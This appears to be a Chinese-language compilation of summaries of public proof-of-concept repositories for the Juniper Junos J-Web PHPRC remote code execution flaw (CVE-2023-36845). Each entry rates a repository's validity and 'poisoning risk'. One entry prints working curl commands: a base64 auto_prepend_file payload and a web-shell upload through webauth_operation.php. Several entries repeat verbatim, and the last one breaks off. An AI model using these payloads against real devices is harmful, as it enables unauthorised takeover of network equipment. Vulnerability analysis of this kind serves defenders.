**来源**: [CVE-2023-36845-iveresk_CVE-2023-36845-6-.md](../2023/CVE-2023-36845-iveresk_CVE-2023-36845-6-.md)

## CVE-2023-36845 Juniper Junos OS J-Web RCE

**漏洞编号:** CVE-2023-36845

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Junos OS J-Web (EX and SRX Series)

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** 受影响版本见CVE描述：所有版本 prior to 20.4R3-S9; 21.1 versions 21.1R1 and later; 21.2 versions prior to 21.2R3-S7; 21.3 versions prior to 21.3R3-S5; 21.4 versions prior to 21.4R3-S5; 22.1 versions prior to 22.1R3-S4; 22.2 versions prior to 22.2R3-S2; 22.3 versions prior to 22.3R2-S2, 22.3R3-S1; 22.4 versions prior to 22.4R2-S1, 22.4R3; 23.2 versions prior to 23.2R1-S1, 23.2R2.

**利用条件:** 目标设备已启用 J-Web 服务 (HTTP 或 HTTPS)。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-36845 是 Juniper Junos OS EX 和 SRX 系列的 J-Web 组件中的一个 PHP 外部变量修改漏洞。该漏洞允许未经身份验证的远程攻击者通过构造特殊的请求来修改 PHP 的执行环境，从而实现远程代码执行。

**利用方式：**

攻击者通过设置 `PHPRC` 环境变量为 `/dev/fd/0`，并通过 `data-binary` 参数传递 PHP 代码。 由于`/dev/fd/0`代表标准输入，攻击者可以将任意PHP代码写入到标准输入中，这些代码会被作为PHP配置文件执行。 在提供的POC中，利用`auto_prepend_file`指令包含`/etc/passwd`文件，从而验证漏洞的存在。 实际的利用中，攻击者可以注入任意的恶意PHP代码，实现远程代码执行。

**有效性：**
提供的 POC 代码通过 curl 发送一个带有恶意 `PHPRC` 参数的 HTTP 请求。 该请求的目标是 `/about.php` 页面，并尝试包含 `/etc/passwd` 文件。 如果目标存在漏洞，则响应中会包含 `/etc/passwd` 的内容，证明 POC 有效。

**投毒风险：**

提供的脚本非常简单，主要功能就是发送包含恶意参数的请求。该脚本没有发现明显的投毒代码。但是，用户需要注意下载的脚本来源，防止被恶意替换。

根据现有信息，代码本身直接包含恶意代码的可能性较低。风险主要在于代码作者可能在其他地方埋藏恶意链接，或者在其他恶意软件中捆绑该脚本。 因此，判断投毒风险为0%。


**项目地址:** [iveresk/CVE-2023-36845-6-](https://github.com/iveresk/CVE-2023-36845-6-)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #12

**来源**: [CVE-2023-36845-jahithoque_Juniper-CVE-2023-36845-Mass-Hunting.md](../2023/CVE-2023-36845-jahithoque_Juniper-CVE-2023-36845-Mass-Hunting.md)

## CVE-2023-36845-Junos OS-PHP外部变量修改导致RCE

**漏洞编号:** CVE-2023-36845

**漏洞类型:** 远程代码执行

**影响应用:** Junos OS (EX Series, SRX Series)

**危害等级:** 严重，允许未经身份验证的远程攻击者执行代码

**影响版本:** 受影响版本包括但不限于：20.4R3-S9之前的所有版本，21.1，21.2R3-S7之前的所有版本，21.3R3-S5之前的所有版本，21.4R3-S5之前的所有版本，22.1R3-S4之前的所有版本，22.2R3-S2之前的所有版本，22.3R2-S2, 22.3R3-S1之前的所有版本，22.4R2-S1, 22.4R3之前的所有版本，23.2R1-S1, 23.2R2之前的所有版本。

**利用条件:** 需要开启J-Web，且可以通过网络访问J-Web服务 (http 或 https)

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-36845 是 Juniper Networks Junos OS 的 J-Web 组件中的一个 PHP 外部变量修改漏洞。攻击者可以通过构造恶意请求，设置 `PHPRC` 环境变量来修改 PHP 的执行环境，从而注入并执行任意代码。

**漏洞利用方式：**

1.  **攻击向量：** 网络
2.  **攻击条件：** 目标设备必须运行受影响版本的 Junos OS，并且启用了 J-Web 管理界面 (http 或 https)。
3.  **漏洞原理：** 通过 `PHPRC` 环境变量，指定一个包含恶意 PHP 代码的文件。由于 J-Web 对该变量的过滤不严，导致 PHP 在执行时会加载并执行该文件，从而实现远程代码执行。
4.  **POC 分析：** 提供的 `Juniper-RCE-Check.sh` 脚本通过发送包含恶意 `PHPRC` 参数的 HTTP 请求到 `/about.php` 页面，其中PHPRC的值被设置为 `/dev/fd/0`，并使用`auto_prepend_file` 尝试将 `/etc/passwd` 的内容包含到响应中。如果响应中包含 `root:` 字符串，则表示目标存在漏洞，攻击者可以利用此漏洞执行任意代码。

**投毒风险分析：**

提供的 `Juniper-RCE-Check.sh` 脚本的功能是检测目标是否存在 CVE-2023-36845 漏洞，而不是进行漏洞利用或植入后门。该脚本只是通过 `curl` 命令发送一个 HTTP 请求，并检查响应的内容。其中使用的`/etc/passwd`只是用于验证，并不会对目标系统造成永久性影响。LICENSE文件也是标准的Creative Commons协议。

**有效性：**
根据漏洞库信息和提供的POC脚本，可以确定该漏洞利用是有效的。POC脚本验证了通过修改`PHPRC`环境变量，攻击者能够控制PHP的执行，从而读取敏感文件 (例如 `/etc/passwd`)。结合漏洞描述，可以推断出利用该漏洞执行任意代码是可行的。

**结论：**
该漏洞为高危漏洞，利用简单，影响范围广。强烈建议受影响的用户及时升级到安全版本。

**项目地址:** [jahithoque/Juniper-CVE-2023-36845-Mass-Hunting](https://github.com/jahithoque/Juniper-CVE-2023-36845-Mass-Hunting)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #13

**来源**: [CVE-2023-36845-kljunowsky_CVE-2023-36845.md](../2023/CVE-2023-36845-kljunowsky_CVE-2023-36845.md)

## CVE-2023-36845-Juniper Junos OS J-Web PHP 外部变量修改 RCE

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改

**影响应用:** Juniper Junos OS J-Web

**危害等级:** 严重，允许未经身份验证的远程代码执行

**影响版本:** 受影响版本请参考漏洞库信息

**利用条件:** 目标设备开启 J-Web 服务，且运行于受影响的 Junos OS 版本

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-36845 漏洞存在于 Juniper Networks Junos OS 的 J-Web 界面中。未经身份验证的攻击者可以通过修改 PHP 的 `PHPRC` 环境变量，从而控制 PHP 的执行环境，最终实现远程代码执行。

**漏洞利用方式：**

1.  **利用 PHPRC 变量:** 攻击者发送特制的 HTTP 请求，其中包含 `PHPRC` 参数，将其指向一个可控的文件描述符 `/dev/fd/0`。利用`auto_prepend_file`参数，加载恶意代码，例如使用 `data://` 协议嵌入经过 base64 编码的 PHP 代码。简单的例子就是读取/etc/passwd 文件进行漏洞验证。

```
curl "http://target.tld/?PHPRC=/dev/fd/0" --data-binary $'allow_url_include=1\nauto_prepend_file="data://text/plain;base64,PD8KICAgcGhwaW5mbygpOwo/Pg=="'
```
2.  **上传文件:**  攻击者可以通过 `/webauth_operation.php` 接口上传包含恶意代码的 PHP 文件，然后通过访问该文件执行恶意代码。
```
$ curl http://target.tld/webauth_operation.php -d 'rs=do_upload&rsargs[]=[{"fileName": "shell.php", "fileData": ",PD9waHAgaWYoaXNzZXQoJF9SRVFVRVNUW2NtZF0pKXsgZWNobyAiPHByZT4iOyAkY21kID0gKCRfUkVRVUVTVFtjbWRdKTsgc3lzdGVtKCRjbWQpOyBlY2hvICI8L3ByZT4iOyBkaWU7IH0/Pgo=\n", "csize": 110}]'
```

**投毒风险分析：**

提供的漏洞利用代码主要用于检测漏洞是否存在，通过读取 `/etc/passwd` 文件进行验证。虽然此行为本身不属于投毒，但如果攻击者利用此代码大规模扫描网络，可能会引起目标系统的注意。

RCE 的方法演示中，利用 `data://` 协议执行任意 PHP 代码，存在一定的风险，攻击者可以利用此方法植入后门代码。上传文件的攻击利用方式，需要找到对应的上传点，并绕过文件上传限制，复杂性较高。

LICENSE文件为MIT许可证，相对安全。
README.md文件提供了Shodan搜索方法和利用方式，整体风险较低，但存在被恶意利用的可能。综合考虑，投毒风险评估为10%。CISA已将此漏洞加入到已知被利用的漏洞目录，证明该漏洞已经被恶意利用。


**项目地址:** [kljunowsky/CVE-2023-36845](https://github.com/kljunowsky/CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #14

**来源**: [CVE-2023-36845-kopfjager007_CVE-2023-36845.md](../2023/CVE-2023-36845-kopfjager007_CVE-2023-36845.md)

## CVE-2023-36845

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改

**影响应用:** Juniper Junos OS J-Web

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 受影响版本见漏洞库信息

**利用条件:** 目标设备开启 J-Web (http 或 https)

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-36845 是一个 Juniper Junos OS EX 系列和 SRX 系列设备 J-Web 组件中的 PHP 外部变量修改漏洞。未经身份验证的远程攻击者可以通过构造恶意请求设置 PHPRC 变量来修改 PHP 执行环境，从而注入并执行任意代码。

**有效性评估：**
根据漏洞库信息，该漏洞是真实存在的，CVSS 评分为 9.8 (Critical)，表明危害程度很高。CISA 已将其添加到已知被利用漏洞目录中，进一步表明该漏洞已被积极利用。

**投毒风险评估：**
提供的漏洞利用代码只是一个包含 README.md 文件的目录。README.md 文件仅包含漏洞名称和简短描述，没有实际的利用代码。因此，该代码本身不存在直接的投毒风险。

但是，需要注意的是，攻击者可能会在其他地方发布包含恶意代码的利用程序，伪装成 CVE-2023-36845 的利用程序。因此，在下载和使用任何利用代码时，都应该进行仔细审查，确保代码的安全性。
由于缺少实际的代码，无法进行更详细的分析，投毒风险评估相对保守。

**利用方式：**
1.  **前提条件：** 目标 Juniper 设备运行受影响的 Junos OS 版本，并且启用了 J-Web 服务（通过 HTTP 或 HTTPS）。
2.  **漏洞触发：** 攻击者构造一个包含 `PHPRC` 变量的 HTTP 请求发送到目标设备的 J-Web 接口。
3.  **代码注入：** 通过 `PHPRC` 变量，攻击者可以指定一个包含恶意 PHP 代码的文件路径，从而修改 PHP 的配置。
4.  **远程代码执行：** 当 J-Web 执行 PHP 代码时，恶意代码将被执行，从而允许攻击者在目标设备上执行任意命令。
5.  **进一步利用：** 攻击者可以通过执行的命令获取系统信息、修改配置、安装后门等，从而完全控制目标设备。

**项目地址:** [kopfjager007/CVE-2023-36845](https://github.com/kopfjager007/CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #15

**来源**: [CVE-2023-36845-simrotion13_CVE-2023-36845.md](../2023/CVE-2023-36845-simrotion13_CVE-2023-36845.md)

## CVE-2023-36845-Juniper-J-Web-PHP外部变量修改导致RCE

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP外部变量修改

**影响应用:** Junos OS J-Web (EX系列和SRX系列)

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 受影响版本请参考漏洞库信息

**利用条件:** 目标设备开启了J-Web管理界面，并且允许通过HTTP或HTTPS访问。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Juniper Junos OS的J-Web管理界面中。攻击者可以通过修改`PHPRC`环境变量，控制PHP的配置，进而执行任意代码。

**漏洞利用方式：**

1.  攻击者发送一个特制的HTTP POST请求到目标J-Web服务器。
2.  该请求包含一个`PHPRC`参数，该参数被设置为指向一个恶意PHP配置文件或包含恶意代码的文件，例如`/dev/fd/0`，并结合`auto_prepend_file`包含`/etc/passwd`。
3.  由于`PHPRC`环境变量被修改，PHP在处理后续请求时会加载攻击者提供的恶意配置。
4.  通过`auto_prepend_file`，强制包含`/etc/passwd`文件内容,以验证漏洞存在。
5. 最终导致攻击者可以远程执行任意代码。

**有效性：**

提供的PoC代码是有效的，它通过`curl`命令发送带有恶意`PHPRC`参数的请求来验证漏洞。如果目标存在漏洞，将会返回`/etc/passwd`的内容，`grep -i 'root:'` 用于检测`/etc/passwd`是否存在，从而判断目标是否漏洞。

**投毒风险：**

分析提供的PoC代码，未发现明显的投毒代码。PoC代码的功能是发送恶意请求并验证漏洞是否存在，并没有执行任何恶意操作（例如植入后门），风险等级判定为0%。


**项目地址:** [simrotion13/CVE-2023-36845](https://github.com/simrotion13/CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #16

**来源**: [CVE-2023-36845-vulncheck-oss_cve-2023-36845-scanner.md](../2023/CVE-2023-36845-vulncheck-oss_cve-2023-36845-scanner.md)

## CVE-2023-36845-Junos OS-J-Web-PHP外部变量修改-远程代码执行

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP外部变量修改

**影响应用:** Junos OS J-Web

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 所有低于 20.4R3-S9 的版本；21.1 版本 21.1R1 及更高版本；21.2 版本低于 21.2R3-S7；21.3 版本低于 21.3R3-S5；21.4 版本低于 21.4R3-S5；22.1 版本低于 22.1R3-S4；22.2 版本低于 22.2R3-S2；22.3 版本低于 22.3R2-S2, 22.3R3-S1；22.4 版本低于 22.4R2-S1, 22.4R3；23.2 版本低于 23.2R1-S1, 23.2R2。

**利用条件:** 启用了 J-Web (HTTP 或 HTTPS) 的 Junos OS 设备。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-36845 是 Juniper Networks Junos OS 中 J-Web 界面的一个 PHP 外部变量修改漏洞。未经身份验证的远程攻击者可以通过发送特制的请求，设置 `PHPRC` 变量来修改 PHP 执行环境，从而注入和执行任意代码。由于漏洞允许远程代码执行，因此风险评级为严重。

**漏洞利用方式：**

1.  攻击者发送一个特制的 HTTP 请求到易受攻击的 Junos 设备上的 J-Web 接口。
2.  此请求包含一个设置 `PHPRC` PHP 配置变量的参数。通过修改该变量，攻击者可以控制 PHP 的配置文件的路径，从而包含恶意的 PHP 代码。
3.  设备执行攻击者提供的 PHP 代码，从而允许攻击者在设备上执行任意命令。

**关于投毒风险：**

分析提供的 `Dockerfile` 和 `LICENSE` 文件，没有发现明显的恶意代码或编译过程中的可疑操作。 `Dockerfile` 只是一个简单的 Go 编译环境，`LICENSE` 是 Apache 2.0 许可。漏洞利用代码部分缺失，无法判断是否存在后门。

但是，考虑到漏洞本身允许远程代码执行，即使提供的 `Dockerfile` 和 `LICENSE` 没有直接的投毒代码，攻击者仍然可以利用该漏洞在目标系统上植入恶意软件。因此，存在一定的投毒风险，假设为10%。

**项目地址:** [vulncheck-oss/cve-2023-36845-scanner](https://github.com/vulncheck-oss/cve-2023-36845-scanner)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #17

**来源**: [CVE-2023-36845-zaenhaxor_CVE-2023-36845.md](../2023/CVE-2023-36845-zaenhaxor_CVE-2023-36845.md)

## CVE-2023-36845-Junos OS-远程代码执行

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP外部变量修改导致远程代码执行

**影响应用:** Junos OS (EX Series 和 SRX Series) J-Web

**危害等级:** 高危，未授权远程代码执行

**影响版本:** 受影响版本: 所有版本 prior to 20.4R3-S9; 21.1 versions 21.1R1 and later; 21.2 versions prior to 21.2R3-S7; 21.3 versions prior to 21.3R3-S5; 21.4 versions prior to 21.4R3-S5; 22.1 versions prior to 22.1R3-S4; 22.2 versions prior to 22.2R3-S2; 22.3 versions prior to 22.3R2-S2, 22.3R3-S1; 22.4 versions prior to 22.4R2-S1, 22.4R3; 23.2 versions prior to 23.2R1-S1, 23.2R2.

**利用条件:** 需要开启J-Web服务 (http或https)

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2023-36845 存在于Juniper Networks Junos OS 的 J-Web 组件中。攻击者可以通过设置 `PHPRC` 环境变量来修改 PHP 运行环境，从而远程执行代码。提供的 `cve.sh` 脚本读取一个包含目标主机列表的文件，然后通过构造包含恶意 `PHPRC` 参数的 HTTP 请求，尝试在目标系统上执行代码。脚本通过检查响应中是否包含 `root:` 字符串来判断漏洞是否成功利用，这是因为脚本尝试通过 `auto_prepend_file` 包含 `/etc/passwd` 文件。 

**有效性：**
POC 代码利用了 PHP 外部变量修改漏洞，通过设置 PHPRC 环境变量来包含任意文件，从而实现远程代码执行。该方法被广泛报道，并且CISA KEV 已经收录，确定了其有效性。

**投毒风险：**
脚本本身相对简单，主要功能是发送 HTTP 请求并检查响应。 投毒风险主要体现在以下几个方面：
*   **明面上的风险：** 脚本使用 curl 命令发送请求，存在被中间人攻击的风险，导致信息泄露或者被篡改。
*   **隐藏的风险：** 虽然脚本代码较为简短，但依然存在作者在其他地方植入恶意代码的可能性，比如通过读取其他配置文件、调用外部命令等方式。但是从目前的代码来看，直接的投毒风险较低， 评估为5%。

**利用方式：**
1.  **确定目标:**  需要一个存在漏洞且开启了 J-Web 服务的 Juniper 设备。
2.  **准备攻击脚本：** 使用提供的 `cve.sh` 脚本。
3.  **构造目标列表：** 创建一个包含目标设备 IP 地址或域名的文本文件（例如 `file.txt`）。
4.  **执行攻击：** 运行 `bash cve.sh file.txt` 命令。
5.  **验证结果：** 脚本会输出哪些主机存在漏洞（`VULN`）。


**项目地址:** [zaenhaxor/CVE-2023-36845](https://github.com/zaenhaxor/CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---



---

## POC #11

**来源**: [CVE-2023-36845-iveresk_CVE-2023-36845-6-.md](../2023/CVE-2023-36845-iveresk_CVE-2023-36845-6-.md)

## CVE-2023-36845 Juniper Junos OS J-Web RCE

**漏洞编号:** CVE-2023-36845

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Junos OS J-Web (EX and SRX Series)

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** 受影响版本见CVE描述：所有版本 prior to 20.4R3-S9; 21.1 versions 21.1R1 and later; 21.2 versions prior to 21.2R3-S7; 21.3 versions prior to 21.3R3-S5; 21.4 versions prior to 21.4R3-S5; 22.1 versions prior to 22.1R3-S4; 22.2 versions prior to 22.2R3-S2; 22.3 versions prior to 22.3R2-S2, 22.3R3-S1; 22.4 versions prior to 22.4R2-S1, 22.4R3; 23.2 versions prior to 23.2R1-S1, 23.2R2.

**利用条件:** 目标设备已启用 J-Web 服务 (HTTP 或 HTTPS)。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-36845 是 Juniper Junos OS EX 和 SRX 系列的 J-Web 组件中的一个 PHP 外部变量修改漏洞。该漏洞允许未经身份验证的远程攻击者通过构造特殊的请求来修改 PHP 的执行环境，从而实现远程代码执行。

**利用方式：**

攻击者通过设置 `PHPRC` 环境变量为 `/dev/fd/0`，并通过 `data-binary` 参数传递 PHP 代码。 由于`/dev/fd/0`代表标准输入，攻击者可以将任意PHP代码写入到标准输入中，这些代码会被作为PHP配置文件执行。 在提供的POC中，利用`auto_prepend_file`指令包含`/etc/passwd`文件，从而验证漏洞的存在。 实际的利用中，攻击者可以注入任意的恶意PHP代码，实现远程代码执行。

**有效性：**
提供的 POC 代码通过 curl 发送一个带有恶意 `PHPRC` 参数的 HTTP 请求。 该请求的目标是 `/about.php` 页面，并尝试包含 `/etc/passwd` 文件。 如果目标存在漏洞，则响应中会包含 `/etc/passwd` 的内容，证明 POC 有效。

**投毒风险：**

提供的脚本非常简单，主要功能就是发送包含恶意参数的请求。该脚本没有发现明显的投毒代码。但是，用户需要注意下载的脚本来源，防止被恶意替换。

根据现有信息，代码本身直接包含恶意代码的可能性较低。风险主要在于代码作者可能在其他地方埋藏恶意链接，或者在其他恶意软件中捆绑该脚本。 因此，判断投毒风险为0%。


**项目地址:** [iveresk/CVE-2023-36845-6-](https://github.com/iveresk/CVE-2023-36845-6-)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #12

**来源**: [CVE-2023-36845-jahithoque_Juniper-CVE-2023-36845-Mass-Hunting.md](../2023/CVE-2023-36845-jahithoque_Juniper-CVE-2023-36845-Mass-Hunting.md)

## CVE-2023-36845-Junos OS-PHP外部变量修改导致RCE

**漏洞编号:** CVE-2023-36845

**漏洞类型:** 远程代码执行

**影响应用:** Junos OS (EX Series, SRX Series)

**危害等级:** 严重，允许未经身份验证的远程攻击者执行代码

**影响版本:** 受影响版本包括但不限于：20.4R3-S9之前的所有版本，21.1，21.2R3-S7之前的所有版本，21.3R3-S5之前的所有版本，21.4R3-S5之前的所有版本，22.1R3-S4之前的所有版本，22.2R3-S2之前的所有版本，22.3R2-S2, 22.3R3-S1之前的所有版本，22.4R2-S1, 22.4R3之前的所有版本，23.2R1-S1, 23.2R2之前的所有版本。

**利用条件:** 需要开启J-Web，且可以通过网络访问J-Web服务 (http 或 https)

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-36845 是 Juniper Networks Junos OS 的 J-Web 组件中的一个 PHP 外部变量修改漏洞。攻击者可以通过构造恶意请求，设置 `PHPRC` 环境变量来修改 PHP 的执行环境，从而注入并执行任意代码。

**漏洞利用方式：**

1.  **攻击向量：** 网络
2.  **攻击条件：** 目标设备必须运行受影响版本的 Junos OS，并且启用了 J-Web 管理界面 (http 或 https)。
3.  **漏洞原理：** 通过 `PHPRC` 环境变量，指定一个包含恶意 PHP 代码的文件。由于 J-Web 对该变量的过滤不严，导致 PHP 在执行时会加载并执行该文件，从而实现远程代码执行。
4.  **POC 分析：** 提供的 `Juniper-RCE-Check.sh` 脚本通过发送包含恶意 `PHPRC` 参数的 HTTP 请求到 `/about.php` 页面，其中PHPRC的值被设置为 `/dev/fd/0`，并使用`auto_prepend_file` 尝试将 `/etc/passwd` 的内容包含到响应中。如果响应中包含 `root:` 字符串，则表示目标存在漏洞，攻击者可以利用此漏洞执行任意代码。

**投毒风险分析：**

提供的 `Juniper-RCE-Check.sh` 脚本的功能是检测目标是否存在 CVE-2023-36845 漏洞，而不是进行漏洞利用或植入后门。该脚本只是通过 `curl` 命令发送一个 HTTP 请求，并检查响应的内容。其中使用的`/etc/passwd`只是用于验证，并不会对目标系统造成永久性影响。LICENSE文件也是标准的Creative Commons协议。

**有效性：**
根据漏洞库信息和提供的POC脚本，可以确定该漏洞利用是有效的。POC脚本验证了通过修改`PHPRC`环境变量，攻击者能够控制PHP的执行，从而读取敏感文件 (例如 `/etc/passwd`)。结合漏洞描述，可以推断出利用该漏洞执行任意代码是可行的。

**结论：**
该漏洞为高危漏洞，利用简单，影响范围广。强烈建议受影响的用户及时升级到安全版本。

**项目地址:** [jahithoque/Juniper-CVE-2023-36845-Mass-Hunting](https://github.com/jahithoque/Juniper-CVE-2023-36845-Mass-Hunting)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #13

**来源**: [CVE-2023-36845-kljunowsky_CVE-2023-36845.md](../2023/CVE-2023-36845-kljunowsky_CVE-2023-36845.md)

## CVE-2023-36845-Juniper Junos OS J-Web PHP 外部变量修改 RCE

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改

**影响应用:** Juniper Junos OS J-Web

**危害等级:** 严重，允许未经身份验证的远程代码执行

**影响版本:** 受影响版本请参考漏洞库信息

**利用条件:** 目标设备开启 J-Web 服务，且运行于受影响的 Junos OS 版本

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-36845 漏洞存在于 Juniper Networks Junos OS 的 J-Web 界面中。未经身份验证的攻击者可以通过修改 PHP 的 `PHPRC` 环境变量，从而控制 PHP 的执行环境，最终实现远程代码执行。

**漏洞利用方式：**

1.  **利用 PHPRC 变量:** 攻击者发送特制的 HTTP 请求，其中包含 `PHPRC` 参数，将其指向一个可控的文件描述符 `/dev/fd/0`。利用`auto_prepend_file`参数，加载恶意代码，例如使用 `data://` 协议嵌入经过 base64 编码的 PHP 代码。简单的例子就是读取/etc/passwd 文件进行漏洞验证。

```
curl "http://target.tld/?PHPRC=/dev/fd/0" --data-binary $'allow_url_include=1\nauto_prepend_file="data://text/plain;base64,PD8KICAgcGhwaW5mbygpOwo/Pg=="'
```
2.  **上传文件:**  攻击者可以通过 `/webauth_operation.php` 接口上传包含恶意代码的 PHP 文件，然后通过访问该文件执行恶意代码。
```
$ curl http://target.tld/webauth_operation.php -d 'rs=do_upload&rsargs[]=[{"fileName": "shell.php", "fileData": ",PD9waHAgaWYoaXNzZXQoJF9SRVFVRVNUW2NtZF0pKXsgZWNobyAiPHByZT4iOyAkY21kID0gKCRfUkVRVUVTVFtjbWRdKTsgc3lzdGVtKCRjbWQpOyBlY2hvICI8L3ByZT4iOyBkaWU7IH0/Pgo=\n", "csize": 110}]'
```

**投毒风险分析：**

提供的漏洞利用代码主要用于检测漏洞是否存在，通过读取 `/etc/passwd` 文件进行验证。虽然此行为本身不属于投毒，但如果攻击者利用此代码大规模扫描网络，可能会引起目标系统的注意。

RCE 的方法演示中，利用 `data://` 协议执行任意 PHP 代码，存在一定的风险，攻击者可以利用此方法植入后门代码。上传文件的攻击利用方式，需要找到对应的上传点，并绕过文件上传限制，复杂性较高。

LICENSE文件为MIT许可证，相对安全。
README.md文件提供了Shodan搜索方法和利用方式，整体风险较低，但存在被恶意利用的可能。综合考虑，投毒风险评估为10%。CISA已将此漏洞加入到已知被利用的漏洞目录，证明该漏洞已经被恶意利用。


**项目地址:** [kljunowsky/CVE-2023-36845](https://github.com/kljunowsky/CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #14

**来源**: [CVE-2023-36845-kopfjager007_CVE-2023-36845.md](../2023/CVE-2023-36845-kopfjager007_CVE-2023-36845.md)

## CVE-2023-36845

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改

**影响应用:** Juniper Junos OS J-Web

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 受影响版本见漏洞库信息

**利用条件:** 目标设备开启 J-Web (http 或 https)

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-36845 是一个 Juniper Junos OS EX 系列和 SRX 系列设备 J-Web 组件中的 PHP 外部变量修改漏洞。未经身份验证的远程攻击者可以通过构造恶意请求设置 PHPRC 变量来修改 PHP 执行环境，从而注入并执行任意代码。

**有效性评估：**
根据漏洞库信息，该漏洞是真实存在的，CVSS 评分为 9.8 (Critical)，表明危害程度很高。CISA 已将其添加到已知被利用漏洞目录中，进一步表明该漏洞已被积极利用。

**投毒风险评估：**
提供的漏洞利用代码只是一个包含 README.md 文件的目录。README.md 文件仅包含漏洞名称和简短描述，没有实际的利用代码。因此，该代码本身不存在直接的投毒风险。

但是，需要注意的是，攻击者可能会在其他地方发布包含恶意代码的利用程序，伪装成 CVE-2023-36845 的利用程序。因此，在下载和使用任何利用代码时，都应该进行仔细审查，确保代码的安全性。
由于缺少实际的代码，无法进行更详细的分析，投毒风险评估相对保守。

**利用方式：**
1.  **前提条件：** 目标 Juniper 设备运行受影响的 Junos OS 版本，并且启用了 J-Web 服务（通过 HTTP 或 HTTPS）。
2.  **漏洞触发：** 攻击者构造一个包含 `PHPRC` 变量的 HTTP 请求发送到目标设备的 J-Web 接口。
3.  **代码注入：** 通过 `PHPRC` 变量，攻击者可以指定一个包含恶意 PHP 代码的文件路径，从而修改 PHP 的配置。
4.  **远程代码执行：** 当 J-Web 执行 PHP 代码时，恶意代码将被执行，从而允许攻击者在目标设备上执行任意命令。
5.  **进一步利用：** 攻击者可以通过执行的命令获取系统信息、修改配置、安装后门等，从而完全控制目标设备。

**项目地址:** [kopfjager007/CVE-2023-36845](https://github.com/kopfjager007/CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #15

**来源**: [CVE-2023-36845-simrotion13_CVE-2023-36845.md](../2023/CVE-2023-36845-simrotion13_CVE-2023-36845.md)

## CVE-2023-36845-Juniper-J-Web-PHP外部变量修改导致RCE

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP外部变量修改

**影响应用:** Junos OS J-Web (EX系列和SRX系列)

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 受影响版本请参考漏洞库信息

**利用条件:** 目标设备开启了J-Web管理界面，并且允许通过HTTP或HTTPS访问。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Juniper Junos OS的J-Web管理界面中。攻击者可以通过修改`PHPRC`环境变量，控制PHP的配置，进而执行任意代码。

**漏洞利用方式：**

1.  攻击者发送一个特制的HTTP POST请求到目标J-Web服务器。
2.  该请求包含一个`PHPRC`参数，该参数被设置为指向一个恶意PHP配置文件或包含恶意代码的文件，例如`/dev/fd/0`，并结合`auto_prepend_file`包含`/etc/passwd`。
3.  由于`PHPRC`环境变量被修改，PHP在处理后续请求时会加载攻击者提供的恶意配置。
4.  通过`auto_prepend_file`，强制包含`/etc/passwd`文件内容,以验证漏洞存在。
5. 最终导致攻击者可以远程执行任意代码。

**有效性：**

提供的PoC代码是有效的，它通过`curl`命令发送带有恶意`PHPRC`参数的请求来验证漏洞。如果目标存在漏洞，将会返回`/etc/passwd`的内容，`grep -i 'root:'` 用于检测`/etc/passwd`是否存在，从而判断目标是否漏洞。

**投毒风险：**

分析提供的PoC代码，未发现明显的投毒代码。PoC代码的功能是发送恶意请求并验证漏洞是否存在，并没有执行任何恶意操作（例如植入后门），风险等级判定为0%。


**项目地址:** [simrotion13/CVE-2023-36845](https://github.com/simrotion13/CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #16

**来源**: [CVE-2023-36845-vulncheck-oss_cve-2023-36845-scanner.md](../2023/CVE-2023-36845-vulncheck-oss_cve-2023-36845-scanner.md)

## CVE-2023-36845-Junos OS-J-Web-PHP外部变量修改-远程代码执行

